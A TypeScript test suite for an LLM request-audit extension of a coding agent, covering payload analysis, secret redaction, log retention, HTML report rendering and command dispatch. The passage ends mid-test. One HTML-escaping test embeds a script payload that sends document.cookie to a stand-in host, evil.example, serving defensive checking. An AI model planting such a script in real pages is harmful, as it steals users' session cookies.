import type { ExtensionCommandContext } from "@earendil-works/pi-coding-agent";
import assert from "node:assert/strict";
import { existsSync } from "node:fs";
import { mkdir, mkdtemp, readFile, rm, stat, utimes, writeFile } from "node:fs/promises";
import { homedir, tmpdir } from "node:os";
import { dirname, join, sep } from "node:path";
import { registerCommands, splitInvocation, SUBCOMMANDS, type AuditController } from "../commands.ts";
import { configPathForSave, saveConfig } from "../config.ts";
import { buildReportModel, openInBrowser, renderHtml, writeHtmlReport } from "../html.ts";
import { readAuditLog } from "../logs.ts";
import { configItems, parseList, parseRetention, runConfigPanel, settingLabel } from "../settings.ts";
import { analyzeProvenance, formatProvenance } from "../provenance.ts";
import { renderMarkdown } from "../markdown.ts";
import { layoutTreemap, renderTreemapSvg } from "../treemap.ts";
import { listSessions } from "../logs.ts";
import { analyzePayload, describeToolSchemas, normalizeUsage } from "../analyzer.ts";
import {
  DEFAULT_CONFIG,
  defaultConfigPath,
  loadConfig,
  validateConfig,
} from "../config.ts";
import { AuditLogger } from "../logger.ts";
import { redactValue } from "../redaction.ts";
import {
  buildExport,
  compareSummaries,
  efficiencyWarnings,
  formatComparison,
  markdownReport,
  statusLineLabel,
  lastRequestSummary,
  compactRequestSummary,
  summarizeExport,
  toolSchemaSummary,
} from "../reporter.ts";
import {
  SCHEMA_VERSION,
  type AuditRequestRecord,
  type PayloadAnalysis,
  type SessionMetrics,
  type UsageRecord,
} from "../types.ts";

const config = {
  ...DEFAULT_CONFIG,
  maxPayloadBytes: 16_384,
  maxFieldBytes: 4_096,
  capturePayload: true,
};
const tests: Array<[string, () => void | Promise<void>]> = [];
const test = (name: string, run: () => void | Promise<void>): void => {
  tests.push([name, run]);
};

const baseMetrics = (): SessionMetrics => ({
  sessionId: "test",
  startedAt: Date.now(),
  requestCount: 0,
  userTurns: 1,
  toolCalls: 0,
  payloadBytes: 0,
  inputTokens: 0,
  outputTokens: 0,
  cacheReadTokens: 0,
  cacheWriteTokens: 0,
  totalCost: 0,
  requestDurationMs: 0,
  requestDurationCount: 0,
  turnDurationMs: 0,
  turnDurationCount: 0,
  compactions: 0,
  requests: [],
  usages: new Map(),
  toolDurations: [],
  toolCallsByName: new Map(),
});

/** Minimal request record so reporter tests exercise real measured shape. */
const auditRequest = (
  analysis: PayloadAnalysis,
  requestSequence = 1,
): AuditRequestRecord => ({
  schemaVersion: SCHEMA_VERSION,
  recordType: "llm_request",
  timestamp: new Date().toISOString(),
  auditRecordId: `r${requestSequence}`,
  sessionId: "test",
  requestSequence,
  userTurn: 1,
  provider: "x",
  model: "y",
  cwd: "/tmp",
  analysis,
  contextAddedBytes: 0,
  followedCompaction: false,
  cumulativeToolCalls: 0,
  payloadStored: false,
});

/** Minimal AuditController over in-memory state, for command dispatch tests. */
const fakeController = (
  directory: string,
  overrides: Partial<AuditController> = {},
): AuditController => {
  let config = { ...DEFAULT_CONFIG, logDirectory: directory };
  const metrics = baseMetrics();
  return {
    getMetrics: () => metrics,
    getConfig: () => config,
    patchConfig: (patch) => {
      config = { ...config, ...patch };
    },
    refreshStatus: () => {},
    saveConfig: async () => ({ path: join(directory, "llm-audit.json") }),
    getLogPath: () => join(directory, "session.jsonl"),
    getLogDirectory: () => directory,
    getSessionId: () => "test",
    clean: async () => 0,
    ...overrides,
  } as AuditController;
};

/** Fake host capturing notifications, so dispatch can be asserted without a TUI. */
const fakeHost = (
  directory: string,
  controller = fakeController(directory),
): { run: (args: string) => Promise<string[]>; controller: AuditController } => {
  const messages: string[] = [];
  let handler: ((args: string, ctx: unknown) => Promise<void>) | undefined;
  registerCommands(
    { registerCommand: (_name: string, def: unknown) => { handler = (def as { handler: typeof handler }).handler; } } as never,
    controller,
  );
  const ctx = {
    hasUI: true,
    ui: {
      notify: (message: string) => messages.push(message),
      select: async () => undefined,
      confirm: async () => false,
      input: async () => undefined,
    },
  };
  return {
    controller,
    run: async (args: string) => {
      messages.length = 0;
      await handler?.(args, ctx);
      return [...messages];
    },
  };
};

const usageRecord = (
  requestSequence: number,
  usage: UsageRecord["usage"],
  totalRequestMs: number,
): UsageRecord => ({
  schemaVersion: SCHEMA_VERSION,
  recordType: "llm_usage",
  timestamp: new Date().toISOString(),
  auditRecordId: `r${requestSequence}`,
  sessionId: "test",
  requestSequence,
  usage,
  timing: { totalRequestMs },
});

/** Synthesise a JSONL line so reader/report tests need no captured fixtures. */
const record = (fields: Record<string, unknown>): string =>
  JSON.stringify({ schemaVersion: SCHEMA_VERSION, sessionId: "test", ...fields });

const requestRecord = (
  requestSequence: number,
  messages: unknown[] | undefined,
  payloadStored: boolean,
  payloadOverride?: Record<string, unknown>,
): string =>
  record({
    recordType: "llm_request",
    timestamp: new Date().toISOString(),
    auditRecordId: `r${requestSequence}`,
    requestSequence,
    userTurn: 1,
    provider: "p",
    model: "m",
    cwd: "/tmp",
    analysis: analyzePayload(
      payloadOverride ?? { messages: messages ?? [] },
      config,
    ),
    contextAddedBytes: 0,
    followedCompaction: false,
    cumulativeToolCalls: 0,
    payloadStored,
    ...(payloadStored && messages
      ? { payload: { model: "m", messages } }
      : {}),
  });

test("analyzes OpenAI Chat Completions payloads", () => {
  const result = analyzePayload(
    {
      model: "gpt",
      messages: [
        { role: "system", content: "rules" },
        { role: "user", content: "hi" },
        { role: "assistant", content: "hello" },
      ],
      tools: [{ type: "function", function: { name: "read" } }],
    },
    config,
  );
  assert.equal(result.providerShape, "openai-chat");
  assert.equal(result.messageCount, 3);
  assert.equal(result.toolDefinitionCount, 1);
  assert.ok(result.sections.systemBytes > 0);
  assert.ok(result.sections.toolDefinitionBytes > 0);
});
test("analyzes OpenAI Responses payloads", () => {
  const result = analyzePayload(
    {
      model: "gpt",
      instructions: "rules",
      input: [{ role: "user", content: "hello" }],
      tools: [{ type: "function", name: "read" }],
    },
    config,
  );
  assert.equal(result.providerShape, "openai-responses");
  assert.ok(result.sections.systemBytes > 0);
  assert.ok(result.sections.userBytes > 0);
});
test("analyzes Anthropic payloads and tool results", () => {
  const result = analyzePayload(
    {
      anthropic_version: "2023-06-01",
      system: [{ type: "text", text: "rules" }],
      messages: [
        { role: "assistant", content: [{ type: "tool_use", id: "x" }] },
        {
          role: "user",
          content: [
            { type: "tool_result", tool_use_id: "x", content: "output" },
          ],
        },
      ],
      tools: [{ name: "read", input_schema: {} }],
    },
    config,
  );
  assert.equal(result.providerShape, "anthropic-messages");
  assert.ok(result.sections.toolResultBytes > 0);
  assert.ok(result.sections.toolDefinitionBytes > 0);
});
test("analyzes Gemini payloads", () => {
  const result = analyzePayload(
    {
      systemInstruction: { parts: [{ text: "rules" }] },
      contents: [
        { role: "user", parts: [{ text: "hi" }] },
        { role: "model", parts: [{ text: "hello" }] },
      ],
      tools: [{ functionDeclarations: [{ name: "read" }] }],
    },
    config,
  );
  assert.equal(result.providerShape, "gemini");
  assert.equal(result.messageCount, 2);
  assert.ok(result.sections.systemBytes > 0);
});
test("unknown payload stays useful", () => {
  const result = analyzePayload({ odd: { nested: ["data"] } }, config);
  assert.equal(result.providerShape, "unknown");
  assert.ok(result.payloadBytes > 0);
  assert.equal(result.topLevelFields[0]?.field, "odd");
});
test("classifies nested multimodal and tool content", () => {
  const result = analyzePayload(
    {
      messages: [
        { role: "user", content: [{ type: "input_image", image_url: "x" }] },
        { role: "tool", content: "result" },
      ],
    },
    config,
  );
  assert.ok(result.sections.multimodalBytes > 0);
  assert.ok(result.sections.toolResultBytes > 0);
});
test("token estimate and byte accounting are explicitly rough", () => {
  const result = analyzePayload(
    { messages: [{ role: "user", content: "abcd" }] },
    { ...config, roughCharactersPerToken: 2 },
  );
  assert.ok(result.payloadBytes > 0);
  assert.ok(result.approximateTokens > 0);
  assert.equal(result.tokenEstimate, "rough_characters");
});
test("normalizes Pi and provider usage without invented zeroes", () => {
  const usage = normalizeUsage({
    input: 10,
    output: 4,
    cacheRead: 3,
    cacheWrite: 2,
    reasoning: 1,
    totalTokens: 20,
    cost: { input: 1, output: 2, cacheRead: 0.1, cacheWrite: 0.2, total: 3.3 },
  });
  assert.deepEqual(usage, {
    inputTokens: 10,
    outputTokens: 4,
    reasoningTokens: 1,
    cacheReadTokens: 3,
    cacheWriteTokens: 2,
    totalTokens: 20,
    inputCost: 1,
    outputCost: 2,
    cacheCost: 0.30000000000000004,
    totalCost: 3.3,
  });
  assert.deepEqual(normalizeUsage({}), {});
});
test("redacts secrets while preserving original payload", () => {
  const source = {
    authorization: "Bearer sk-secret-123456789",
    nested: { password: "p", text: "postgres://user:pw@host/db" },
  };
  const safe = redactValue(source, config).value;
  assert.equal(source.authorization, "Bearer sk-secret-123456789");
  assert.equal((safe as Record<string, unknown>).authorization, "[REDACTED]");
  assert.match(JSON.stringify(safe), /\[REDACTED\]/);
});
test("configuration falls back safely on invalid input", () => {
  const parsed = validateConfig({
    mode: "bad",
    maxPayloadBytes: -1,
    redactPatterns: [3],
  });
  assert.equal(parsed.mode, "metrics");
  assert.equal(parsed.maxPayloadBytes, DEFAULT_CONFIG.maxPayloadBytes);
  assert.deepEqual(parsed.redactPatterns, []);
});
test("oversized payload handling truncates capture", () => {
  const result = analyzePayload(
    { messages: [{ role: "user", content: "x".repeat(50_000) }] },
    { ...config, maxPayloadBytes: 2_000, maxFieldBytes: 512 },
  );
  assert.equal(result.payloadTruncated, true);
  assert.ok(result.payloadBytes < 3_000);
});
test("JSONL logging writes valid separate concurrent session files", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-"));
  try {
    const local = { ...config, logDirectory: directory };
    const a = new AuditLogger(local, "a");
    const b = new AuditLogger(local, "b");
    a.write({
      schemaVersion: SCHEMA_VERSION,
      recordType: "session_start",
      timestamp: new Date().toISOString(),
      sessionId: "a",
    });
    b.write({
      schemaVersion: SCHEMA_VERSION,
      recordType: "session_start",
      timestamp: new Date().toISOString(),
      sessionId: "b",
    });
    await Promise.all([a.flush(), b.flush()]);
    assert.equal(
      JSON.parse((await readFile(a.filePath, "utf8")).trim()).sessionId,
      "a",
    );
    assert.equal(
      JSON.parse((await readFile(b.filePath, "utf8")).trim()).sessionId,
      "b",
    );
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("expiry cleanup honours retentionDays 0 as disabled", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-retention-"));
  try {
    const old = join(directory, "old.jsonl");
    await writeFile(old, "{}\n", { encoding: "utf8", mode: 0o600 });
    const oldTime = Date.now() - 400 * 24 * 60 * 60 * 1000;
    await utimes(old, new Date(oldTime), new Date(oldTime));

    // 0 must mean "never clean": the old file survives.
    const never = new AuditLogger(
      { ...config, logDirectory: directory, retentionDays: 0 },
      "s",
    );
    assert.equal(await never.cleanExpired(), 0);
    assert.equal(existsSync(old), true);

    // Positive retention removes only files older than the cutoff.
    const fresh = join(directory, "fresh.jsonl");
    await writeFile(fresh, "{}\n", { encoding: "utf8", mode: 0o600 });
    const keep = new AuditLogger(
      { ...config, logDirectory: directory, retentionDays: 30 },
      "s",
    );
    assert.equal(await keep.cleanExpired(), 1);
    assert.equal(existsSync(old), false);
    assert.equal(existsSync(fresh), true);
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("reports and heuristics use measured request data", () => {
  const metrics = baseMetrics();
  const request = {
    schemaVersion: SCHEMA_VERSION,
    recordType: "llm_request" as const,
    timestamp: new Date().toISOString(),
    auditRecordId: "r",
    sessionId: "test",
    requestSequence: 1,
    userTurn: 1,
    provider: "x",
    model: "y",
    cwd: "/tmp",
    analysis: analyzePayload(
      {
        system: "s".repeat(2_000),
        messages: [{ role: "user", content: "hi" }],
        tools: [{ name: "huge", description: "x".repeat(2_000) }],
      },
      config,
    ),
    contextAddedBytes: 0,
    followedCompaction: false,
    cumulativeToolCalls: 0,
    payloadStored: false,
  };
  metrics.requests.push(request);
  metrics.requestCount = 1;
  metrics.payloadBytes = request.analysis.payloadBytes;
  metrics.inputTokens = 1_000;
  metrics.cacheReadTokens = 9_000;
  metrics.outputTokens = 900;
  assert.ok(efficiencyWarnings(metrics).length > 0);
  assert.match(markdownReport(metrics), /Cache-read ratio \| 90.0%/);
  assert.match(markdownReport(metrics), /Session overview/);
  // per-tool attribution must reach the rendered report, not just the record
  assert.match(markdownReport(metrics), /## Tool schema cost/);
  assert.match(markdownReport(metrics), /\| huge \| .* \| 0 \|/);
  assert.equal(buildExport(metrics).requests.length, 1);
});
test("attributes tool schema size per tool across provider shapes", () => {
  const openai = describeToolSchemas(
    {
      tools: [
        {
          type: "function",
          function: { name: "read", description: "a".repeat(100) },
        },
        {
          type: "function",
          function: { name: "bash", description: "b".repeat(1_000) },
        },
      ],
    },
    config,
  );
  assert.deepEqual(
    openai.map((tool) => tool.name),
    ["bash", "read"],
  );
  assert.ok(openai[0]!.bytes > openai[1]!.bytes);
  assert.deepEqual(
    describeToolSchemas(
      { tools: [{ name: "grep", input_schema: { type: "object" } }] },
      config,
    ).map((tool) => tool.name),
    ["grep"],
  );
  assert.deepEqual(
    describeToolSchemas(
      { tools: [{ functionDeclarations: [{ name: "find" }, { name: "list" }] }] },
      config,
    )
      .map((tool) => tool.name)
      .sort(),
    ["find", "list"],
  );
  const analyzed = analyzePayload(
    { tools: [{ name: "big", description: "c".repeat(500) }] },
    config,
  );
  assert.equal(analyzed.tools.length, 1);
  assert.ok(
    analyzed.tools[0]!.bytes <= analyzed.sections.toolDefinitionBytes,
  );
});
test("flags tool schemas that were never called in the session", () => {
  const metrics = baseMetrics();
  const request = auditRequest(
    analyzePayload(
      {
        tools: [
          { name: "used", description: "x".repeat(200) },
          { name: "unused", description: "y".repeat(4_000) },
        ],
      },
      config,
    ),
  );
  metrics.requests.push(request);
  metrics.requestCount = 1;
  metrics.payloadBytes = request.analysis.payloadBytes;
  metrics.toolCallsByName.set("used", 2);
  assert.ok(
    efficiencyWarnings(metrics).some(
      (warning) => warning.id === "unused-tool-schemas",
    ),
  );
  assert.match(toolSchemaSummary(metrics), /unused \| .*\(never called\)/);
  metrics.toolCallsByName.set("unused", 1);
  assert.ok(
    !efficiencyWarnings(metrics).some(
      (warning) => warning.id === "unused-tool-schemas",
    ),
  );
});
test("summarizes and compares exports with signed deltas", () => {
  const baselineMetrics = baseMetrics();
  const baselineRequest = auditRequest(
    analyzePayload({ system: "s".repeat(1_000) }, config),
  );
  baselineMetrics.requests.push(baselineRequest);
  baselineMetrics.requestCount = 1;
  baselineMetrics.payloadBytes = baselineRequest.analysis.payloadBytes;
  baselineMetrics.usages.set(
    1,
    usageRecord(1, { inputTokens: 1_000, outputTokens: 100 }, 2_000),
  );
  const candidateMetrics = baseMetrics();
  const candidateRequest = auditRequest(
    analyzePayload(
      {
        system: "s".repeat(1_000),
        tools: [{ name: "big", description: "z".repeat(3_000) }],
      },
      config,
    ),
  );
  candidateMetrics.requests.push(candidateRequest);
  candidateMetrics.requestCount = 1;
  candidateMetrics.payloadBytes = candidateRequest.analysis.payloadBytes;
  candidateMetrics.usages.set(
    1,
    usageRecord(1, { inputTokens: 4_000, outputTokens: 100 }, 2_000),
  );
  const baseline = summarizeExport(buildExport(baselineMetrics));
  const candidate = summarizeExport(buildExport(candidateMetrics));
  // ratio is measured as 0 when tokens exist but nothing was cached,
  // and stays null only when no token data was reported at all
  assert.equal(baseline.cacheRatio, 0);
  assert.equal(
    summarizeExport(buildExport(baseMetrics())).cacheRatio,
    null,
  );
  assert.ok(candidate.toolSchemaBytes > baseline.toolSchemaBytes);
  const rows = compareSummaries(baseline, candidate);
  assert.equal(
    rows.find((row) => row.label === "tool schema bytes")!.delta,
    candidate.toolSchemaBytes - baseline.toolSchemaBytes,
  );
  assert.equal(
    rows.find((row) => row.label === "input tokens")!.delta,
    3_000,
  );
  // Cached tokens can exceed newly-read input tokens, so the ratio must be a
  // bounded share of (input + cacheRead), matching the report's convention —
  // dividing by input alone produced 3.7 in a real session.
  const cached = baseMetrics();
  const cachedRequest = auditRequest(
    analyzePayload({ system: "s".repeat(100) }, config),
  );
  cached.requests.push(cachedRequest);
  cached.requestCount = 1;
  cached.payloadBytes = cachedRequest.analysis.payloadBytes;
  cached.usages.set(
    1,
    usageRecord(1, { inputTokens: 1_000, cacheReadTokens: 9_000 }, 1_000),
  );
  const cachedSummary = summarizeExport(buildExport(cached));
  assert.equal(cachedSummary.cacheRatio, 0.9);
  assert.ok(cachedSummary.cacheRatio! <= 1);
  const text = formatComparison(baseline, candidate);
  assert.match(text, /negative is cheaper/);
  assert.match(text, /input tokens: 1,000 -> 4,000 \(\+3,000\)/);
});
test("prefers the active profile's config file when it exists", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-config-"));
  const previous = process.env.PI_CODING_AGENT_DIR;
  try {
    process.env.PI_CODING_AGENT_DIR = directory;
    assert.equal(
      defaultConfigPath(),
      join(homedir(), ".pi/agent/llm-audit.json"),
    );
    const scoped = join(directory, "llm-audit.json");
    await writeFile(
      scoped,
      JSON.stringify({ enabled: false, mode: "redacted" }),
    );
    assert.equal(defaultConfigPath(), scoped);
    const loaded = loadConfig();
    assert.equal(loaded.config.mode, "redacted");
    assert.equal(loaded.config.enabled, false);
  } finally {
    if (previous === undefined) delete process.env.PI_CODING_AGENT_DIR;
    else process.env.PI_CODING_AGENT_DIR = previous;
    await rm(directory, { recursive: true, force: true });
  }
});
test("reads a log back, deduping re-sent prefixes by content hash", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-read-"));
  const path = join(directory, "session.jsonl");
  const system = { role: "system", content: "S".repeat(500) };
  const first = { role: "user", content: "hello" };
  const answer = { role: "assistant", content: "hi" };
  const tool = { role: "tool", content: "file contents" };
  await writeFile(
    path,
    [
      record({ recordType: "session_start", timestamp: "2026-01-01T00:00:00.000Z" }),
      requestRecord(1, [system, first], true),
      requestRecord(2, [system, first, answer], true),
      requestRecord(3, [system, first, answer, tool], true),
    ].join("\n") + "\n",
  );
  try {
    const log = await readAuditLog(path);
    assert.equal(log.requests.length, 3);
    assert.equal(log.requestsWithoutPayload, 0);
    // 4 distinct messages, not 7 instances: re-sent prefixes are one message
    assert.equal(log.messages.size, 4);
    const systemMessage = [...log.messages.values()].find(
      (message) => message.bytes > 400,
    );
    assert.equal(systemMessage?.sends, 3);
    assert.equal(log.skippedLines, 0);
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("prefix changes and compaction are not reported as duplication", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-delta-"));
  const path = join(directory, "session.jsonl");
  const system = { role: "system", content: "S".repeat(400) };
  const one = { role: "user", content: "one" };
  const two = { role: "assistant", content: "two" };
  const three = { role: "tool", content: "three" };
  await writeFile(
    path,
    [
      requestRecord(1, [system, one], true),
      requestRecord(2, [system, one, two], true),
      // prompt changed: first message differs, rest identical — the whole prefix
      // must NOT be counted as newly added context (this regressed once and
      // reported 1.8 MiB of phantom waste on a real log)
      requestRecord(3, [{ role: "system", content: "S".repeat(400) + " v2" }, one, two, three], true),
      // compaction: shorter list, earlier messages dropped
      requestRecord(4, [one, two], true),
    ].join("\n") + "\n",
  );
  try {
    const log = await readAuditLog(path);
    const model = buildReportModel(log);
    const afterPrefixChange = model.deltas.find(
      (delta) => delta.requestSequence === 3,
    );
    assert.equal(afterPrefixChange?.added.length, 2, "new system + tool only");
    assert.ok(afterPrefixChange?.prefixChanged);
    const afterCompaction = model.deltas.find(
      (delta) => delta.requestSequence === 4,
    );
    assert.equal(afterCompaction?.removedCount, 2);
    assert.equal(afterCompaction?.added.length, 0);
    assert.equal(model.totals.duplicateWastedBytes, 0);
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("counts content that appears twice inside one request as waste", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-dup-"));
  const path = join(directory, "session.jsonl");
  const big = { role: "tool", content: "D".repeat(2_000) };
  await writeFile(
    path,
    [requestRecord(1, [big, big], true)].join("\n") + "\n",
  );
  try {
    const model = buildReportModel(await readAuditLog(path));
    assert.equal(model.duplicates.length, 1);
    assert.equal(model.duplicates[0]?.instances, 2);
    assert.ok(model.totals.duplicateWastedBytes >= 2_000);
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("escapes captured content and stays self-contained", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-html-"));
  const path = join(directory, "session.jsonl");
  await writeFile(
    path,
    [
      requestRecord(
        1,
        [
          {
            role: "tool",
            content: '<script>fetch("https://evil.example/"+document.cookie)</script>',
          },
        ],
        true,
      ),
    ].join("\n") + "\n",
  );
  try {
    const model = buildReportModel(await readAuditLog(path, { embedBodies: true }));
    const html = renderHtml(model);
    // payload text must never become markup or a script tag
    assert.ok(html.includes("&lt;script&gt;"), "payload text is escaped");
    assert.ok(!html.includes("<script>"), "no script tag is emitted");
    // Content hyperlinks are allowed (and useful), but nothing that would make
    // the browser fetch something on its own.
    assert.ok(!/(?:src|url\()\s*["']?https?:/i.test(html), "no external subresources");
    assert.ok(
      !/<(script|img|link|iframe|object|embed)\b/i.test(html),
      "no element that pulls in external content",
    );
    assert.ok(!/href="javascript:/i.test(html), "no javascript: links");
    assert.ok(/<style>/.test(html) && html.includes("<style>"), "styles are inline");
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("report degrades gracefully without captured payloads", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-metrics-"));
  const path = join(directory, "session.jsonl");
  await writeFile(
    path,
    [
      requestRecord(
        1,
        undefined,
        false,
        { system: "s".repeat(1_000), tools: [{ name: "read" }] },
      ),
    ].join("\n") + "\n",
  );
  try {
    const { output, bytes, model } = await writeHtmlReport(
      path,
      join(directory, "out.html"),
    );
    assert.equal(model.messages.length, 0);
    assert.ok(model.totals.fixedBytes > 1_000);
    assert.ok(bytes > 5_000 && bytes < 200_000);
    assert.match(
      await readFile(output, "utf8"),
      /had no captured payload/,
    );
    const mode = (await stat(output)).mode & 0o777;
    assert.equal(mode, 0o600, "reports may quote source code: 0600 only");
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("embeds whole message bodies so rows expand to the full content", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-full-"));
  const path = join(directory, "session.jsonl");
  // 100 KiB: comfortably over the old 64 KiB cut, well under the ceiling
  const tail = "END-OF-MESSAGE-MARKER";
  const huge = { role: "tool", content: "L".repeat(100 * 1024) + tail };
  await writeFile(path, requestRecord(1, [huge], true) + "\n");
  try {
    const model = buildReportModel(await readAuditLog(path, { embedBodies: true }), {
      embedBodies: true,
    });
    const message = model.messages[0]!;
    assert.equal(message.omitReason, undefined, "under the ceiling: complete body");
    const html = renderHtml(model);
    assert.ok(html.includes(tail), "the end of the message is in the file");
    assert.ok(html.includes("show message"), "row advertises the expansion");
    assert.ok(html.includes('<details class="row" id="m-'), "expansion is an anchored details row");
    assert.equal(
      (html.match(/L{500,}/g) ?? []).length,
      1,
      "body embedded once, not duplicated into the preview",
    );
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("flags bodies that hit the ceiling or the total budget", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-limits-"));
  const path = join(directory, "session.jsonl");
  const first = { role: "tool", content: "A".repeat(5_000) };
  const second = { role: "tool", content: "B".repeat(5_000) };
  await writeFile(path, requestRecord(1, [first, second], true) + "\n");
  try {
    const cut = await readAuditLog(path, {
      embedBodies: true,
      limits: { maxMessageBytes: 1_000 },
    });
    assert.equal(
      [...cut.messages.values()][0]?.omitReason,
      "limit",
      "over the per-message ceiling is reported as cut",
    );
    const spent = await readAuditLog(path, {
      embedBodies: true,
      limits: { maxTotalBodyBytes: 1_000 },
    });
    assert.equal(
      [...spent.messages.values()][0]?.omitReason,
      "budget",
      "past the total budget is reported, not silently empty",
    );
    assert.ok(
      renderHtml(buildReportModel(spent, { embedBodies: true })).includes(
        "body budget spent",
      ),
    );
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("opens the report without letting a headless box break the command", async () => {
  const opened = await openInBrowser("/tmp/report.html", {
    platform: "darwin",
    run: async () => undefined,
  });
  assert.equal(opened.opened, true);
  assert.match(opened.detail, /open/);
  let seen: string[] = [];
  await openInBrowser("/tmp/report.html", {
    platform: "linux",
    run: async (command, args) => {
      seen = [command, ...args];
    },
  });
  assert.deepEqual(seen, ["xdg-open", "/tmp/report.html"]);
  const failed = await openInBrowser("/tmp/report.html", {
    platform: "linux",
    run: async () => {
      throw new Error("no DISPLAY");
    },
  });
  assert.equal(failed.opened, false, "failure is reported, not thrown");
  assert.match(failed.detail, /still written/);
});
test("splits subcommand invocations", () => {
  assert.deepEqual(splitInvocation(""), { name: "status", rest: "" });
  assert.deepEqual(splitInvocation("   "), { name: "status", rest: "" });
  assert.deepEqual(splitInvocation("capture full"), {
    name: "capture",
    rest: "full",
  });
  assert.deepEqual(splitInvocation("html latest --no-open"), {
    name: "html",
    rest: "latest --no-open",
  });
  assert.deepEqual(splitInvocation("compare /tmp/x.json"), {
    name: "compare",
    rest: "/tmp/x.json",
  });
});
test("exposes exactly one command that dispatches every subcommand", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-dispatch-"));
  const host = fakeHost(directory);
  const names = Object.keys(SUBCOMMANDS);
  assert.ok(names.length >= 14, `documented subcommands: ${names.length}`);
  try {
    for (const name of names) {
      const messages = await host.run(name === "html" ? "html --no-open" : name);
      assert.ok(messages.length > 0, `/${name} produced output`);
      assert.ok(
        !messages.some((message) => message.includes("Unknown subcommand")),
        `/${name} is dispatchable`,
      );
      assert.ok(
        !messages.some((message) => message.includes("Usage: /llm-audit capture")),
        `/${name} does not fall into another subcommand's usage text`,
      );
    }
    // capture validates its argument rather than silently ignoring it
    assert.match((await host.run("capture nope"))[0] ?? "", /Usage/);
    assert.match(
      (await host.run("capture"))[0] ?? "",
      /mode metrics/,
    );
    await host.run("capture redacted");
    assert.equal(host.controller.getConfig().mode, "redacted");
    assert.equal(host.controller.getConfig().capturePayload, true);
    await host.run("capture metrics");
    assert.equal(host.controller.getConfig().capturePayload, false);
    // session toggles flip the live flag
    await host.run("off");
    assert.equal(host.controller.getConfig().enabled, false);
    await host.run("toggle");
    assert.equal(host.controller.getConfig().enabled, true);
    const unknown = await host.run("nonsense");
    assert.match(unknown[0] ?? "", /Unknown subcommand "nonsense"/);
    assert.match(unknown[0] ?? "", /capture/);
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("command subcommands write their files where compare expects them", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-writes-"));
  const host = fakeHost(directory);
  try {
    await host.run("report");
    await host.run("export");
    await host.run("baseline");
    assert.ok(existsSync(join(directory, "test.report.md")));
    assert.ok(existsSync(join(directory, "test.export.json")));
    assert.ok(existsSync(join(directory, "test.export.csv")));
    const baseline = join(directory, "baseline.export.json");
    assert.ok(existsSync(baseline), "baseline lands where compare looks");
    assert.equal((await stat(baseline)).mode & 0o777, 0o600);
    // compare reads that same file without being told the path
    const compared = await host.run("compare");
    assert.match(compared[0] ?? "", /baseline test -> candidate test/);
    // and rejects a file that is not an audit export
    const junk = join(directory, "junk.json");
    await writeFile(junk, JSON.stringify({ hello: "world" }));
    assert.match((await host.run(`compare ${junk}`))[0] ?? "", /not an llm-audit export/);
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("labels settings and parses their values", () => {
  const config = {
    ...DEFAULT_CONFIG,
    mode: "full" as const,
    capturePayload: true,
    retentionDays: 7,
    logDirectory: "~/logs",
    excludeProviders: ["openai"],
  };
  assert.equal(configItems(config).length, 8);
  assert.match(settingLabel("mode", config), /full \(payload stored\)/);
  assert.match(settingLabel("excludeProviders", config), /openai/);
  assert.match(settingLabel("retentionDays", config), /7 day/);
  assert.match(settingLabel("enabled", config), /Capture: enabled/);
  assert.deepEqual(parseList("a, b  c"), ["a", "b", "c"]);
  assert.deepEqual(parseList("   "), []);
  assert.equal(parseRetention("30"), 30);
  assert.equal(parseRetention("0"), 0);
  assert.equal(parseRetention("-1"), undefined);
  assert.equal(parseRetention("abc"), undefined);
  assert.equal(parseRetention("4000"), undefined);
});
test("save path follows the active profile", () => {
  const previous = process.env.PI_CODING_AGENT_DIR;
  try {
    process.env.PI_CODING_AGENT_DIR = "/tmp/fake-profile";
    assert.equal(configPathForSave(), "/tmp/fake-profile/llm-audit.json");
    delete process.env.PI_CODING_AGENT_DIR;
    assert.match(configPathForSave(), /llm-audit\.json$/);
  } finally {
    if (previous === undefined) delete process.env.PI_CODING_AGENT_DIR;
    else process.env.PI_CODING_AGENT_DIR = previous;
  }
});
test("saves settings without clobbering a file it cannot parse", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-save-"));
  const path = join(directory, "nested", "llm-audit.json");
  try {
    await mkdir(dirname(path), { recursive: true });
    await writeFile(path, "{ not json");
    const refused = await saveConfig({ mode: "full" }, path);
    assert.ok(refused.error, "refuses to overwrite unparseable config");
    assert.equal(await readFile(path, "utf8"), "{ not json", "file untouched");

    await rm(path);
    const saved = await saveConfig(
      {
        mode: "redacted",
        capturePayload: true,
        retentionDays: 5,
        logDirectory: "~/logs",
      },
      path,
    );
    assert.equal(saved.error, undefined);
    const written = JSON.parse(await readFile(path, "utf8")) as Record<string, unknown>;
    assert.equal(written.mode, "redacted");
    assert.equal(written.capturePayload, true);
    assert.equal(written.retentionDays, 5);
    assert.equal(written.logDirectory, "~/logs", "keeps the user's own spelling");
    assert.equal((await stat(path)).mode & 0o777, 0o600, "config can enable capture: 0600");

    await writeFile(
      path,
      JSON.stringify({ mode: "metrics", customField: "keep me" }),
    );
    await saveConfig({ showStatus: false }, path);
    const merged = JSON.parse(await readFile(path, "utf8")) as Record<string, unknown>;
    assert.equal(merged.customField, "keep me", "unknown keys survive a save");
